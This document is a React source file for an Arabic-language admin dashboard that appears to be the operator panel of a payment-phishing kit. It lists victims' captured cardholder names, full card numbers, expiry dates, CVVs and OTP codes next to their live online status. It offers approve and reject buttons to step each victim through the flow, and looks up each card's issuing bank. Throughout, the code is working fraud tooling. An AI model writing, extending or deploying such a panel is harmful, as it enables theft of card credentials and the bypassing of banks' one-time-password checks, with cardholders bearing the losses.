import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { RefreshCw, LogOut, Eye, CreditCard } from "lucide-react";
import {
  subscribeToVisitors,
  subscribeToFormSubmissions,
  getOnlineVisitorsCount,
  VisitorData,
  FormSubmission,
} from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

interface CombinedData {
  visitorId: string;
  country: string;
  city: string;
  isOnline: boolean;
  currentPage: string;
  lastSeen: any;
  buyerInfo: Record<string, any> | null;
  paymentInfo: Record<string, any> | null;
  paymentSuccess: boolean;
  code: string;
}

interface BinInfo {
  scheme: string;
  type: string;
  brand: string;
  bank: {
    name: string;
    url?: string;
    phone?: string;
    city?: string;
  };
  country: {
    name: string;
    emoji?: string;
    currency?: string;
    alpha2?: string;
  };
}

const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
  try {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
    if (bin.length < 6) return null;
    
    const response = await fetch(`https://lookup.binlist.net/${bin}`);
    if (!response.ok) return null;
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("BIN lookup failed:", error);
    return null;
  }
};

function CreditCardDisplay({ paymentInfo, binInfo }: { paymentInfo: Record<string, any>; binInfo: BinInfo | null }) {
  const cardNumber = paymentInfo.cardLast4 || "";
  const formattedNumber = cardNumber.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();
  
  const getCardSchemeColor = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") return "from-blue-600 to-blue-800";
    if (scheme === "mastercard") return "from-red-500 to-orange-500";
    if (scheme === "amex" || scheme === "american express") return "from-gray-600 to-gray-800";
    return "from-emerald-600 to-teal-700";
  };

  const getCardSchemeLogo = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") {
      return (
        <div className="text-white font-bold text-xl italic tracking-wider">VISA</div>
      );
    }
    if (scheme === "mastercard") {
      return (
        <div className="flex items-center">
          <div className="w-8 h-8 bg-red-500 rounded-full opacity-90 -mr-3"></div>
          <div className="w-8 h-8 bg-yellow-400 rounded-full opacity-90"></div>
        </div>
      );
    }
    return <CreditCard className="w-8 h-8 text-white" />;
  };

  return (
    <div className={`w-full max-w-sm mx-auto rounded-2xl p-6 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-xl relative overflow-hidden`}>
      <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
      <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2"></div>
      
      <div className="flex items-start justify-between mb-8 relative z-10">
        <div>
          {binInfo?.bank?.name && (
            <div className="text-white/90 text-sm font-medium mb-1">{binInfo.bank.name}</div>
          )}
          {binInfo?.country?.name && (
            <div className="text-white/60 text-xs">{binInfo.country.name}</div>
          )}
        </div>
        <div className="bg-white/20 px-3 py-1 rounded text-sm font-medium">
          {binInfo?.country?.currency || "SAR"}
        </div>
      </div>

      <div className="mb-6 relative z-10">
        <div className="font-mono text-xl tracking-widest" dir="ltr">
          {formattedNumber || "•••• •••• •••• ••••"}
        </div>
      </div>

      <div className="flex items-end justify-between relative z-10">
        <div className="flex-1">
          <div className="text-white/60 text-xs mb-1">حامل البطاقة</div>
          <div className="font-medium text-sm uppercase tracking-wide">
            {paymentInfo.cardholderName || "N/A"}
          </div>
        </div>
        
        <div className="flex gap-6 items-end">
          <div className="text-center">
            <div className="text-white/60 text-xs mb-1">تاريخ</div>
            <div className="font-mono text-sm">{paymentInfo.expiryDate || "MM/YY"}</div>
          </div>
          
          <div className="text-center">
            <div className="text-white/60 text-xs mb-1">CVV</div>
            <div className="font-mono text-sm font-bold">{paymentInfo.cvv || "•••"}</div>
          </div>
        </div>
      </div>

      <div className="flex items-center justify-between mt-6 pt-4 border-t border-white/20 relative z-10">
        <div className="flex items-center gap-2">
          <span className={`px-2 py-0.5 rounded text-xs font-medium ${
            binInfo?.type?.toLowerCase() === "debit" 
              ? "bg-green-500/30 text-green-100" 
              : "bg-purple-500/30 text-purple-100"
          }`}>
            {binInfo?.type?.toUpperCase() || "CARD"}
          </span>
          {binInfo?.brand && (
            <span className="px-2 py-0.5 rounded text-xs font-medium bg-white/20">
              {binInfo.brand}
            </span>
          )}
        </div>
        {getCardSchemeLogo()}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { user, isLoading: authLoading, logout } = useAuth();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([]);
  const [onlineCount, setOnlineCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
  const [showBuyerInfo, setShowBuyerInfo] = useState(false);
  const [showPaymentInfo, setShowPaymentInfo] = useState(false);
  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
  const [loadingBin, setLoadingBin] = useState(false);

  useEffect(() => {
    if (!authLoading && !user) {
      setLocation("/admin/login");
    }
  }, [user, authLoading, setLocation]);

  useEffect(() => {
    if (!user) return;

    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data);
      setIsLoading(false);
    });

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data);
    });

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count);
    });

    return () => {
      unsubVisitors();
      unsubForms();
      unsubOnline();
    };
  }, [user]);

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp?.toDate) return "N/A";
    const date = timestamp.toDate();
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);

    if (minutes < 1) return "الآن";
    if (minutes < 60) return `منذ ${minutes} دقيقة`;
    if (hours < 24) return `منذ ${hours} ساعات تقريباً`;
    return `منذ ${Math.floor(diff / 86400000)} يوم`;
  };

  const handleLogout = async () => {
    await logout();
    setLocation("/admin/login");
  };

  const combinedData: CombinedData[] = visitors.map((visitor) => {
    const buyerSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "buyer_details",
    );
    const paymentSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "payment_attempt",
    );

    return {
      visitorId: visitor.visitorId,
      country: visitor.country || "Unknown",
      city: visitor.city || "",
      isOnline: visitor.isOnline || false,
      currentPage: visitor.currentPage || "الرئيسية",
      lastSeen: visitor.lastSeen,
      buyerInfo: buyerSubmission?.data || null,
      paymentInfo: paymentSubmission?.data || null,
      paymentSuccess: paymentSubmission?.success || false,
      code: paymentSubmission?.data?.otp || "",
    };
  });

  const handleViewBuyerInfo = (data: CombinedData) => {
    setSelectedData(data);
    setShowBuyerInfo(true);
  };

  const handleViewPaymentInfo = async (data: CombinedData) => {
    setSelectedData(data);
    setShowPaymentInfo(true);
    setBinInfo(null);
    
    if (data.paymentInfo?.cardLast4) {
      setLoadingBin(true);
      const info = await lookupBin(data.paymentInfo.cardLast4);
      setBinInfo(info);
      setLoadingBin(false);
    }
  };

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 text-[#8A1538] animate-spin mx-auto mb-4" />
          <p className="text-gray-600">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <div className="bg-white border-b border-gray-200 py-4 px-6">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold text-[#8A1538]">
              إدارة الإشعارات
            </h1>
            <span className="text-sm text-gray-500">
              عرض وإدارة جميع الإشعارات والبيانات المستلمة (
              {combinedData.filter(row => row.paymentInfo).length}) إشعار
            </span>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" size="sm" className="text-gray-600">
              مسح الكل
            </Button>
            <Button
              onClick={handleLogout}
              variant="ghost"
              size="sm"
              className="text-gray-600"
            >
              <LogOut className="w-4 h-4 ml-1" />
              خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        <div className="bg-white rounded-lg shadow-sm overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-50 border-b border-gray-200">
                <tr>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الإجراءات
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    حامل البطاقة
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    OTP
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الاتصال
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الوقت
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الحالة
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    المعلومات
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الدولة
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {combinedData.filter(row => row.paymentInfo).length > 0 ? (
                  combinedData.filter(row => row.paymentInfo).map((row) => (
                    <tr key={row.visitorId} className="hover:bg-gray-50">
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <button className="p-1.5 rounded bg-gray-100 hover:bg-gray-200 text-gray-600">
                            <Eye className="w-4 h-4" />
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-green-500 hover:bg-green-600 text-white">
                            موافقة
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-red-500 hover:bg-red-600 text-white">
                            رفض
                          </button>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-gray-700 font-medium">
                        {row.paymentInfo?.cardholderName || "-"}
                      </td>
                      <td className="px-4 py-3">
                        {row.code ? (
                          <span className="font-mono text-lg font-bold text-[#8A1538] bg-[#8A1538]/10 px-2 py-1 rounded">
                            {row.code}
                          </span>
                        ) : (
                          <span className="text-gray-400">-</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        <span
                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
                            row.isOnline
                              ? "bg-green-100 text-green-700"
                              : "bg-yellow-100 text-yellow-700"
                          }`}
                        >
                          {row.isOnline ? "متصل" : "غير متصل"}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-gray-600">
                        {formatTimeAgo(row.lastSeen)}
                      </td>
                      <td className="px-4 py-3">
                        <span
                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
                            row.paymentSuccess
                              ? "bg-green-100 text-green-700"
                              : "bg-yellow-100 text-yellow-700"
                          }`}
                        >
                          {row.paymentSuccess ? "موافق" : "معلق"}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          {row.buyerInfo ? (
                            <button
                              onClick={() => handleViewBuyerInfo(row)}
                              className="px-2 py-1 rounded text-xs font-medium bg-blue-500 text-white hover:bg-blue-600"
                            >
                              معلومات شخصية
                            </button>
                          ) : (
                            <span className="text-gray-400 text-xs">
                              لا يوجد معلومات
                            </span>
                          )}
                          {row.paymentInfo ? (
                            <button
                              onClick={() => handleViewPaymentInfo(row)}
                              className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600 flex items-center gap-1"
                            >
                              <CreditCard className="w-3 h-3" />
                              معلومات البطاقة
                            </button>
                          ) : (
                            <span className="text-gray-400 text-xs">
                              لا يوجد بطاقة
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <span
                            className={`w-2 h-2 rounded-full ${row.isOnline ? "bg-green-500" : "bg-gray-400"}`}
                          ></span>
                          <span className="text-gray-700">{row.country}</span>
                        </div>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td
                      colSpan={8}
                      className="px-4 py-12 text-center text-gray-500"
                    >
                      لا توجد إشعارات حتى الآن
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <Dialog open={showBuyerInfo} onOpenChange={setShowBuyerInfo}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right text-[#8A1538]">
              معلومات المشتري
            </DialogTitle>
          </DialogHeader>
          {selectedData?.buyerInfo && (
            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    الاسم الكامل
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.firstName}{" "}
                    {selectedData.buyerInfo.lastName}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    البريد الإلكتروني
                  </span>
                  <span className="text-sm font-medium break-all">
                    {selectedData.buyerInfo.email || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    رقم الهاتف
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.phone || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الجنس</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.gender || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الدولة</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.country || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">المدينة</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.city || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الجنسية</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.nationality || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    الفريق المفضل
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.favoriteTeam || "N/A"}
                  </span>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <Dialog open={showPaymentInfo} onOpenChange={setShowPaymentInfo}>
        <DialogContent className="max-w-lg" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right text-[#8A1538]">
              معلومات البطاقة
            </DialogTitle>
          </DialogHeader>
          {selectedData?.paymentInfo && (
            <div className="space-y-4">
              {loadingBin ? (
                <div className="flex items-center justify-center py-8">
                  <RefreshCw className="w-6 h-6 text-[#8A1538] animate-spin" />
                  <span className="mr-2 text-gray-500">جاري تحميل معلومات البنك...</span>
                </div>
              ) : (
                <CreditCardDisplay 
                  paymentInfo={selectedData.paymentInfo} 
                  binInfo={binInfo} 
                />
              )}
              
              <div className="grid grid-cols-2 gap-3 mt-4">
                <div className="bg-[#8A1538]/10 rounded-lg p-4 text-center">
                  <span className="text-xs text-[#8A1538]/70 block mb-1">OTP</span>
                  <span className="text-2xl font-bold font-mono text-[#8A1538]">
                    {selectedData.paymentInfo.otp || "-"}
                  </span>
                </div>
                <div className={`rounded-lg p-4 text-center ${
                  selectedData.paymentSuccess 
                    ? "bg-green-100" 
                    : "bg-red-100"
                }`}>
                  <span className={`text-xs block mb-1 ${
                    selectedData.paymentSuccess 
                      ? "text-green-600" 
                      : "text-red-600"
                  }`}>الحالة</span>
                  <span className={`text-lg font-bold ${
                    selectedData.paymentSuccess 
                      ? "text-green-700" 
                      : "text-red-700"
                  }`}>
                    {selectedData.paymentSuccess ? "ناجح ✓" : "فشل ✗"}
                  </span>
                </div>
              </div>

              {binInfo && (
                <div className="bg-gray-50 rounded-lg p-4 mt-4">
                  <h4 className="text-sm font-medium text-gray-700 mb-3">معلومات البنك</h4>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div>
                      <span className="text-gray-500">البنك:</span>
                      <span className="font-medium mr-1">{binInfo.bank?.name || "غير معروف"}</span>
                    </div>
                    <div>
                      <span className="text-gray-500">الدولة:</span>
                      <span className="font-medium mr-1">{binInfo.country?.name || "غير معروف"}</span>
                    </div>
                    <div>
                      <span className="text-gray-500">النوع:</span>
                      <span className="font-medium mr-1">{binInfo.type || "غير معروف"}</span>
                    </div>
                    <div>
                      <span className="text-gray-500">الشبكة:</span>
                      <span className="font-medium mr-1">{binInfo.scheme || "غير معروف"}</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
